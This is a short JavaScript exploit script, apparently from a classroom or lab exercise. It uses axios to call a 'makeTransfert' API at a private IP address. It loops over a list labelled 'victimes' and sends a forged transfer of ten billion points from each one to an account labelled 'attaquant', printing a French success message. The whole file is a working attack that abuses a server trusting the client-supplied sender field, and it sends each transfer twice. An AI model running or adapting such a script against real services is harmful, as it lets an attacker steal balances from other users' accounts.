import axios from 'axios';

const url = 'http://172.30.150.102/api/transfert/makeTransfert';

export const makeTransfert = (data) => axios.post(`${url}`, {data});

var victimes = [
	"ranya",
	"nobody12344",
	"nobody",
	"nobody123445",
	"thihnezzy"
]
var attaquant = "ranya2"
var points = 10000000000

for (var i=0; i < victimes.length; i++) {
	var data = {
		sender: victimes[i],
		receiver: attaquant,
		points: points
	}

	makeTransfert(data);
	var isTransfert = await makeTransfert(data);
	if(isTransfert.data['status'] == true)
		console.log("Félicitaion : Vous venez de donner "+points+" points à "+attaquant);
	else
		console.log("Une erreur c'est produite : "+isTransfert.data['message']);
}